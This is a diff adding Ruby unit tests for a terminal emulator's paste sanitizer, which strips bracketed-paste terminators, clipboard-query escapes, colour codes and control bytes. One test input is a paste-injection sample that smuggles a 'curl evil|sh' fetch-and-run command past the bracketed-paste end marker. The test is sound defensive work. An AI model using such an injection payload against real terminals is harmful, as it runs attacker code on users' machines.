@@ -540,6 +540,24 @@ class Echoes::GUIOscTrustGateTest < Test::Unit::TestCase
     assert_raise(ArgumentError) { config { clipboard_read :sometimes } }
   end
 
+  # --- paste sanitizing ---
+
+  test "sanitize_paste strips the bracketed-paste terminator and other escapes" do
+    assert_equal "ls\rcurl evil|sh\r",
+                 Echoes::GUI.sanitize_paste("ls\n\e[201~curl evil|sh\r")
+    assert_equal "x", Echoes::GUI.sanitize_paste("\e]52;c;?\ax\e]0;title\e\\")
+    assert_equal "plain", Echoes::GUI.sanitize_paste("\e[31mplain\e[0m")
+    assert_equal "ab", Echoes::GUI.sanitize_paste("a\x00\x01\x7f\u009bb")
+  end
+
+  test "sanitize_paste sends newlines as CR and keeps tabs" do
+    assert_equal "a\rb\rc\td", Echoes::GUI.sanitize_paste("a\nb\r\nc\td")
+  end
+
+  test "sanitize_paste leaves ordinary text, including non-ASCII, alone" do
+    assert_equal "日本語 émoji 🎉", Echoes::GUI.sanitize_paste("日本語 émoji 🎉")
+  end
+
   # --- capture path restriction ---
 
   def with_capture_dir
